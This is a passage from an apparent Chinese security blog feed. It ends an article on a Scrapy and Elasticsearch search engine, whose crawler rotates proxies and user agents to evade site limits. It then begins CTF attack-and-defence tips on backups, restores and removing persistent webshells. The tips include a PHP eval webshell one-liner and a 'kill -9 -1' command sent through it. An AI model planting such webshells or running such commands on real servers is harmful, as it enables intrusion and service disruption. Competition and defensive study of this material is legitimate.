class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SE 2.X MetaSr 1.0; SE 2.X MetaSr 1.0; .NET CLR 2.0.50727; SE 2.X MetaSr 1.0)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>在 setting.py 的 Download Middware 参数配置中添加定义的类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DOWNLOADER_MIDDLEWARES = &#123;</span><br><span class="line">    <span class="string">'crawlersec.middlewares.CrawlersecDownloaderMiddleware'</span>: <span class="number">543</span>,</span><br><span class="line">    <span class="string">'crawlersec.middlewares.RandomUserAgentMiddleware'</span>: <span class="number">400</span>,</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x1-3-2-IP限制"><a href="#0x1-3-2-IP限制" class="headerlink" title="0x1.3.2 IP限制"></a>0x1.3.2 IP限制</h3><p>反爬策略：同一 IP 访问网站过于频繁，就会对该 IP 进行限制，短时间内无法访问。<br>绕过方式：<br>1.维护一个 IP 代理池，每次请求随机使用 一个 IP 代理<br>2.调小爬虫的线程并发数，或每次请求后，设置一个短时间暂停 </p><p>这里就从一些免费的站点中获取一些 IP,并保存在 proxies.py 文件中<br>如 <a href="http://www.xiladaili.com" target="_blank" rel="noopener">www.xiladaili.com</a> 站点</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SeeBugSpider</span><span class="params">(scrapy.Spider)</span>:</span></span><br><span class="line">    name=<span class="string">"proxy"</span></span><br><span class="line">    allowed_domains=[<span class="string">"www.xiladaili.com"</span>]</span><br><span class="line">    base_url=<span class="string">"http://www.xiladaili.com/"</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start_requests</span><span class="params">(self)</span>:</span></span><br><span class="line">        tmp_url=<span class="string">"http://www.xiladaili.com/gaoni/&#123;&#125;/"</span></span><br><span class="line">        f = open(<span class="string">'proxies.txt'</span>, <span class="string">"r+"</span>)</span><br><span class="line">        f.truncate()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,<span class="number">200</span>):<span class="comment">#数字可查看官网链接</span></span><br><span class="line">            <span class="keyword">yield</span> scrapy.Request(url=tmp_url.format(i),callback=self.parse)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(self,response)</span>:</span></span><br><span class="line">        proxy_list=response.xpath(<span class="string">"//tbody//tr/td/text()"</span>).extract()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(proxy_list),<span class="number">8</span>):</span><br><span class="line">            self.verify_one_proxy(proxy_list[i+<span class="number">1</span>],proxy_list[i])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">verify_one_proxy</span><span class="params">(self,protocol,url)</span>:</span></span><br><span class="line">        schema = <span class="string">'https'</span> <span class="keyword">if</span> <span class="string">'https'</span> <span class="keyword">in</span> protocol <span class="keyword">else</span> <span class="string">'http'</span></span><br><span class="line">        proxies = &#123;schema: url&#125;</span><br><span class="line">        print(proxies)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> requests.get(<span class="string">'https://www.baidu.com/'</span>, proxies=proxies, timeout=<span class="number">2</span>).status_code == <span class="number">200</span>:</span><br><span class="line">                <span class="keyword">with</span> open(<span class="string">'./proxies.txt'</span>, <span class="string">'a+'</span>,encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(schema+<span class="string">"://"</span>+url+<span class="string">"\n"</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>在 Scrapy 的 middlewares.py 中定义一个 ProxyMiddleWare 类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProxyMiddleWare</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">"""docstring for ProxyMiddleWare"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_request</span><span class="params">(self, request, spider)</span>:</span></span><br><span class="line">        <span class="string">'''对request对象加上proxy'''</span></span><br><span class="line">        proxy = self.get_random_proxy()</span><br><span class="line">        print(<span class="string">"this is request ip:"</span> + proxy)</span><br><span class="line">        request.meta[<span class="string">'proxy'</span>] = proxy</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_response</span><span class="params">(self, request, response, spider)</span>:</span></span><br><span class="line">        <span class="string">'''对返回的response处理'''</span></span><br><span class="line">        <span class="comment"># 如果返回的response状态不是200,重新生成当前request对象</span></span><br><span class="line">        <span class="keyword">if</span> response.status != <span class="number">200</span>:</span><br><span class="line">            proxy = self.get_random_proxy()</span><br><span class="line">            print(<span class="string">"this is response ip:"</span> + proxy)</span><br><span class="line">            <span class="comment"># 对当前request加上代理</span></span><br><span class="line">            request.meta[<span class="string">'proxy'</span>] = proxy</span><br><span class="line">            <span class="keyword">return</span> request</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_random_proxy</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">'''随机从文件中读取proxy'''</span></span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">'./proxies.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                proxies = f.readlines()</span><br><span class="line">            <span class="keyword">if</span> proxies:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">                <span class="comment">#time.sleep(1)</span></span><br><span class="line">        proxy = random.choice(proxies).strip()</span><br><span class="line">        <span class="keyword">return</span> proxy</span><br></pre></td></tr></table></figure><p>在 setting.py 的 Download Middware 参数中添加配置的类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DOWNLOADER_MIDDLEWARES = &#123;</span><br><span class="line">    <span class="string">'crawlersec.middlewares.CrawlersecDownloaderMiddleware'</span>: <span class="number">543</span>,</span><br><span class="line">    <span class="string">'crawlersec.middlewares.ProxyMiddleWare'</span>: <span class="number">540</span>,</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x1-3-3-Cookie"><a href="#0x1-3-3-Cookie" class="headerlink" title="0x1.3.3 Cookie"></a>0x1.3.3 Cookie</h3><p>反爬策略：文章需要登录后才能访问<br>绕过方法：<br>1.手动登录获取 Cookie,将 Cookie 添加到爬虫脚本中<br>2.模拟登录 </p><h3 id="0x1-3-4-Header"><a href="#0x1-3-4-Header" class="headerlink" title="0x1.3.4 Header"></a>0x1.3.4 Header</h3><p>反爬策略：网站的文章需要带特定的头部请求才能允许访问,如Referer等<br>绕过方法：   每次请求中添加需要的头部<br>例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">headers=&#123;</span><br><span class="line">                <span class="string">"X-Requested-With"</span>:<span class="string">"XMLHttpRequest"</span>,</span><br><span class="line">                <span class="string">"Referer"</span>: <span class="string">"https://www.kanxue.com/"</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">yield</span> scrapy.FormRequest(url=url,formdata=data,headers=headers,callback=self.parse)</span><br></pre></td></tr></table></figure><h1 id="0x2-数据检索"><a href="#0x2-数据检索" class="headerlink" title="0x2.数据检索"></a>0x2.数据检索</h1><p>当数据爬取后，对数据建立倒排索引，方便我们快速搜索        </p><h2 id="0x2-1-倒排索引"><a href="#0x2-1-倒排索引" class="headerlink" title="0x2.1 倒排索引"></a>0x2.1 倒排索引</h2><p>倒排索引也称全文索引，检索程序对文章的每一个词建立一个索引，指明该词在文章中出现的次数和位置，当用户查询时，检索程序就根据事先建立的索引进行查找，并将查找的结果反馈给用户的检索方式。这个过程类似于通过字典中的检索字表查字的过程。</p><p>例如有两篇文章：<br>文章1内容：<code>it is sunny today</code><br>文章2内容：<code>today is rainy</code> </p><p>1.首先取得关键字<br>文章1关键字：<code>[it] [is] [sunny] [today]</code><br>文章2关键字：<code>[today] [is] [rainy]</code><br>2.建立倒排索引<br>有了关键词后，就可以建立倒排索引了。上面的对应关系是：“文章号”对“文章中所有关键词”。倒排索引把这个关系倒过来，变成: “关键词”对“拥有该关键词的所有文章号”。 </p><table><thead><tr><th>关键词</th><th>文章号</th></tr></thead><tbody><tr><td>it</td><td>1</td></tr><tr><td>is</td><td>1,2</td></tr><tr><td>sunny</td><td>1</td></tr><tr><td>today</td><td>1,2</td></tr><tr><td>rainy</td><td>2</td></tr></tbody></table><p>通常仅知道关键词在哪些文章中出现还不够，我们还需要知道关键词在文章中出现次数和出现的位置</p><table><thead><tr><th>关键词</th><th>文章号[出现频率]</th><th>出现位置</th></tr></thead><tbody><tr><td>it</td><td>1[1]</td><td>1</td></tr><tr><td>is</td><td>1[1]</td><td>2</td></tr><tr><td>is</td><td>2[1]</td><td>2</td></tr><tr><td>sunny</td><td>1[1]</td><td>3</td></tr><tr><td>today</td><td>1[1]</td><td>4</td></tr><tr><td>today</td><td>2[1]</td><td>1</td></tr><tr><td>rainy</td><td>2[1]</td><td>3</td></tr></tbody></table><p>实现时，将上面三列分别作为词典文件（Term Dictionary）、频率文件(frequencies)、位置文件 (positions)保存。其中词典文件不仅保存有每个关键词，还保留了指向频率文件和位置文件的指针，通过指针可以找到该关键字的频率信息和位置信息。    </p><h2 id="0x2-2-elasticsearch"><a href="#0x2-2-elasticsearch" class="headerlink" title="0x2.2 elasticsearch"></a>0x2.2 elasticsearch</h2><p>数据检索这里借助了 Elasticsearch。Elasticsearch的 Mapping 提供了对 Elasticsearch 中索引字段名及其数据类型的定义，还可以对某些字段添加特殊属性：该字段是否分词，是否存储，使用什么样的分词器等。</p><p>常用的数据类型(type)有：string、text、date等<br>Elaticsearch 的 mapping 样例如下，对文章链接、标题、作者、发布日期、正文内容、网站域名这六个字段指定检索方式   </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">mappings = &#123;</span><br><span class="line">        <span class="string">"mappings"</span>: &#123;</span><br><span class="line">                <span class="string">"properties"</span>: &#123;</span><br><span class="line">                    <span class="string">"url"</span>: &#123;</span><br><span class="line">                        <span class="string">"type"</span>: <span class="string">"keyword"</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="string">"title"</span>: &#123;</span><br><span class="line">                        <span class="string">"type"</span>: <span class="string">"text"</span>,</span><br><span class="line">                        <span class="string">"analyzer"</span>: <span class="string">"ik_max_word"</span>,</span><br><span class="line">                        <span class="string">"search_analyzer"</span>: <span class="string">"ik_max_word"</span>,</span><br><span class="line">                        <span class="string">"fields"</span>: &#123;</span><br><span class="line">                            <span class="string">"keyword"</span>: &#123;</span><br><span class="line">                                <span class="string">"type"</span>: <span class="string">"keyword"</span>,</span><br><span class="line">                                <span class="string">"ignore_above"</span>: <span class="number">256</span></span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="string">"author"</span>: &#123;</span><br><span class="line">                        <span class="string">"type"</span>: <span class="string">"text"</span>,</span><br><span class="line">                        <span class="string">"analyzer"</span>: <span class="string">"ik_max_word"</span>,</span><br><span class="line">                        <span class="string">"search_analyzer"</span>: <span class="string">"ik_max_word"</span>,</span><br><span class="line">                        <span class="string">"fields"</span>: &#123;</span><br><span class="line">                            <span class="string">"keyword"</span>: &#123;</span><br><span class="line">                                <span class="string">"type"</span>: <span class="string">"keyword"</span>,</span><br><span class="line">                                <span class="string">"ignore_above"</span>: <span class="number">256</span></span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="string">"date"</span>: &#123;</span><br><span class="line">                        <span class="string">"type"</span>: <span class="string">"date"</span>,</span><br><span class="line">                        <span class="string">"format"</span>: <span class="string">"yyyy-MM-dd HH:mm:ss||yyyy-MM-dd||epoch_millis"</span></span><br><span class="line"></span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="string">"content"</span>: &#123;</span><br><span class="line">                        <span class="string">"type"</span>: <span class="string">"text"</span>,</span><br><span class="line">                        <span class="string">"analyzer"</span>: <span class="string">"ik_max_word"</span>,</span><br><span class="line">                        <span class="string">"search_analyzer"</span>: <span class="string">"ik_max_word"</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="string">"domain"</span>: &#123;</span><br><span class="line">                        <span class="string">"type"</span>: <span class="string">"text"</span>,</span><br><span class="line">                        <span class="string">"analyzer"</span>: <span class="string">"ik_max_word"</span>,</span><br><span class="line">                        <span class="string">"search_analyzer"</span>: <span class="string">"ik_max_word"</span>,</span><br><span class="line">                        <span class="string">"fields"</span>: &#123;</span><br><span class="line">                            <span class="string">"keyword"</span>: &#123;</span><br><span class="line">                                <span class="string">"type"</span>: <span class="string">"keyword"</span>,</span><br><span class="line">                                <span class="string">"ignore_above"</span>: <span class="number">256</span></span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1 id="0x3-数据搜索"><a href="#0x3-数据搜索" class="headerlink" title="0x3.数据搜索"></a>0x3.数据搜索</h1><p>对数据检索完后，就可以搜索，然而如果搜索结果有一千个，甚至成千上万个呢？哪个又是您最想要的文章？</p><p>打开 google ,搜索 “web安全”，返回 518000000 条结果，好大的一个数字，在众多的搜索结果中，如何将最相关的放在最前面？<br><img src="../../images/scrapy/secarticle/7.png" alt=""></p><p>先简单了解一下数据搜索的过程：<br>1.搜索字符串分词<br>对输入的 “web安全”进行分词：web 、安全、安、全<br>2.搜索字符串和文档的相关性计算<br>首先，一个文档有很多词(Term)组成，如web、安全、安、全、等。<br>其次对于文档之间的关系，不同的 Term 重要性不同，比如对于本篇文档，“web、安全”就相对重要一些，“的、地、可”可能相对不重要一些。所以如果两篇文档都包含“web、安全”，这两篇文档的相关性好一些，然而就算一篇文档包含“的、地、可”，另一篇文档不包含“的、地、可”，也不能影响两篇文档的相关性。</p><p>因而判断文档之间的关系，首先找出哪些词(Term)对文档之间的关系最重要，如“web、安全”,然后判断这些词(Term)之间的关系。  </p><p><strong>找出词(Term)对文档的重要性的过程称为计算词的权重(Term weight)的过程。</strong><br>计算词的权重(Term weight)有两个参数，第一个是词(Term)，第二个是文档(Document)<br><strong>判断词(Term)之间的关系从而得到文档相关性的过程应用一种叫做向量空间模型的算法(Vector Space Model)。</strong> </p><p>（1）计算权重<br>影响一个词(Term)在一篇文档中的重要性主要有两个因素：</p><ul><li>Term Frequency (tf)：即此Term在此文档中出现了多少次。tf 越大说明越重要。</li><li>Document Frequency (df)：即有多少文档包含次Term。df 越大说明越不重要。  </li></ul><p>词(Term)在文档中出现的次数越多，说明此词(Term)对该文档越重要，如“web”这个词，在本文档中出现的次数很多，说明本文档主要就是讲这方面的事的。然而在一篇文档中，“的”出现的次数更多，就说明越重要吗？不是的，这是由第二个因素进行调整，第二个因素说明，有越多的文档包含此词(Term), 说明此词(Term)太普通，不足以区分这些文档，因而重要性越低。<br>权重计算公式如下：<br><img src="../../images/scrapy/secarticle/8.png" alt=""><br><img src="../../images/scrapy/secarticle/9.png" alt=""><br>（2）向量空间模型的算法(VSM)<br>我们把文档看作一系列词(Term)，每一个词(Term)都有一个权重(Term weight)，不同的词(Term)根据自己在文档中的权重来影响文档相关性的打分计算。<br>于是我们把所有此文档中词(term)的权重(term weight) 看作一个向量。<br>Document = {term1, term2, …… ,term N}<br>Document Vector = {weight1, weight2, …… ,weight N}<br>同样我们把查询语句看作一个简单的文档，也用向量来表示。<br>Query = {term1, term 2, …… , term N}<br>Query Vector = {weight1, weight2, …… , weight N}<br>我们把所有搜索出的文档向量及查询向量放到一个N维空间中，每个词(term)是一维。</p><p>如图：<br><img src="../../images/scrapy/secarticle/10.jpg" alt=""></p><p>我们认为两个向量之间的夹角越小，相关性越大。</p><p>所以我们计算夹角的余弦值作为相关性的打分，夹角越小，余弦值越大，打分越高，相关性越大。<br>相关性打分公式如下：<br><img src="../../images/scrapy/secarticle/11.png" alt=""></p><h1 id="0x4-系统展示"><a href="#0x4-系统展示" class="headerlink" title="0x4 系统展示"></a>0x4 系统展示</h1><p>最终项目地址：<a href="http://secsea.cfyqy.com/" target="_blank" rel="noopener">http://secsea.cfyqy.com/</a>  。写得有点简洁，莫喷。<br>1.web界面<br>显示最近一周的实时文章和相关资讯<br><img src="../../images/scrapy/secarticle/12.png" alt=""><br>显示收录文章数量比较多的站点<br><img src="../../images/scrapy/secarticle/13.png" alt=""><br>2.搜索功能<br>提供了正文内容搜索、标题搜索、作者搜索、时间搜索、站点数据搜索功能。</p><p>默认使用的是正文内容搜索<br><img src="../../images/scrapy/secarticle/14.png" alt=""><br>只想要某个站点的数据，并显示最近一年的<br><img src="../../images/scrapy/secarticle/15.png" alt=""> </p><p>参考文章：<br>倒排索引原理和实现: <a href="https://www.cnblogs.com/binyue/p/3380750.html" target="_blank" rel="noopener">https://www.cnblogs.com/binyue/p/3380750.html</a><br>全文检索的基本原理：<a href="https://www.cnblogs.com/forfuture1978/archive/2009/12/14/1623594.html" target="_blank" rel="noopener">https://www.cnblogs.com/forfuture1978/archive/2009/12/14/1623594.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一个搜索引擎的实现流程大概为：首先获取海量的数据，整理成统一的格式，然后交给索引程序建立索引，当索引建立好后，就可以进行搜索。简而言之就是：数据获取&lt;code&gt;-&amp;gt;&lt;/code&gt;数据检索&lt;code&gt;-&amp;gt;&lt;/code&gt;数据搜索&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>AWD攻防技巧</title>
    <link href="https://blog.cfyqy.com/article/64465197.html"/>
    <id>https://blog.cfyqy.com/article/64465197.html</id>
    <published>2020-10-27T16:21:00.000Z</published>
    <updated>2020-12-19T15:45:09.740Z</updated>
    
    <content type="html"><![CDATA[<p>AWD的攻防思路和脚本整理</p><a id="more"></a><h1 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h1><h2 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h2><p>备份好处：</p><ul><li>别⼈直接把源码给你删了或者删库，可直接备份过去，防⽌down机被扣分  </li><li>快速寻找发现漏洞，或者⽤D盾、360、⽕绒等扫，看看有没预留后⻔</li><li>当你被种⻢以后，找不到⻢的位置，或者⻢被插⼊某个⽂件，可重新下载⽂件和初始版本进⾏对⽐（beyond compare），看看差别</li></ul><h3 id="网站源码"><a href="#网站源码" class="headerlink" title="网站源码"></a>网站源码</h3><p>连接ssh( 常⻅⼯具mobaXterm，xtfp，finalshell)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -p ssh_port username@host_ip</span><br></pre></td></tr></table></figure><p>修改ssh密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd</span><br></pre></td></tr></table></figure><p>网站源码压缩 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/www/html                      </span><br><span class="line">tar -zcvf /tmp/xxx.tar.gz  ./*</span><br></pre></td></tr></table></figure><p>下载到本地</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -P ssh_port ctf@host_ip:/tmp/xxx.tar.gz local_file</span><br></pre></td></tr></table></figure><h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><p>数据库的账户密码,可在网站配置文件如 config.php 里寻找<br>数据库登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql –pdb_user –udb_passwd </span><br><span class="line">mysql&gt;show databases;</span><br></pre></td></tr></table></figure><p>备份指定数据库，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -udb_user -pdb_passwd db_name &gt; /tmp/bak.sql</span><br></pre></td></tr></table></figure><p>备份所有数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -udb_user -pdb_passwd  --all-databases&lt; back.sql</span><br></pre></td></tr></table></figure><p>下载到本地</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -P ssh_port ctf@host_ip:/tmp/bak.sql local_file</span><br></pre></td></tr></table></figure><h2 id="恢复"><a href="#恢复" class="headerlink" title="恢复"></a>恢复</h2><h3 id="网站源码-1"><a href="#网站源码-1" class="headerlink" title="网站源码"></a>网站源码</h3><p>本地备份上传到靶机，/tmp目录下的文件如果没有被删除，这步就不用 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -P  local_file ssh_port ctf@host_ip:/tmp/xxx.tar.gz</span><br></pre></td></tr></table></figure><p>源码解压</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zcvf /tmp/xxx.tar.gz /var/www/html/*</span><br></pre></td></tr></table></figure><h3 id="数据库-1"><a href="#数据库-1" class="headerlink" title="数据库"></a>数据库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">数据库登录：mysql -udb_user -pdb_passwd </span><br><span class="line"></span><br><span class="line">创建数据库：mysql&gt;create database db_name;</span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> 还原：mysql&gt;use db_name;                mysql&gt;<span class="built_in">source</span> /tmp/bak.sql</span><br><span class="line"></span><br><span class="line">mysql 还原：mysql -udb_user -pdb_passwd db_name&lt; /tmp/bak.sql</span><br></pre></td></tr></table></figure><h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2><p>一些WAF工具<br><a href="https://github.com/dycsy/awd-watchbird" target="_blank" rel="noopener">https://github.com/dycsy/awd-watchbird</a><br><a href="https://github.com/edwardchoijc/ctf-toolkit/tree/master/Linux/WAF" target="_blank" rel="noopener">https://github.com/edwardchoijc/ctf-toolkit/tree/master/Linux/WAF</a><br><a href="https://github.com/DasSecurity-Labs/AoiAWD" target="_blank" rel="noopener">https://github.com/DasSecurity-Labs/AoiAWD</a></p><h2 id="文件监控"><a href="#文件监控" class="headerlink" title="文件监控"></a>文件监控</h2><p>寻找最近20分钟修改的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /var/www/html -name *.php -mmin -20</span><br></pre></td></tr></table></figure><h2 id="杀不死马"><a href="#杀不死马" class="headerlink" title="杀不死马"></a>杀不死马</h2><ul><li><p>建立一个和不死马一样名字的文件夹，这样不死马就写不进去了。完全杀死不死马，得清理内存。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -rf .2.php | mkdir .2.php</span><br></pre></td></tr></table></figure></li><li><p>杀进程得在root或者www-data权限下。如上传一句话，然后执行 system(‘kill -9 -1’); 杀死所有进程，再手动删除木马   </p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell.php: &lt;?php @<span class="built_in">eval</span>(<span class="variable">$_GET</span>[<span class="string">'9415'</span>]); ?&gt;</span><br><span class="line">url访问：shell.php?9415=system(<span class="string">'kill -9 -1'</span>);</span><br></pre></td></tr></table></figure></li><li><p>用一个脚本竞争写入，脚本同不死马，usleep要低于对方不死马设置的值.<br>top 查看占用率最高的cpu进程<br>q 退出<br>M 根据驻留内存大小进行排序<br>P 根据CPU使用百分比大小进行排序</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   <span class="keyword">while</span> (1) &#123;</span><br><span class="line"><span class="variable">$pid</span> = 不死⻢的进程PID;</span><br><span class="line">@unlink(<span 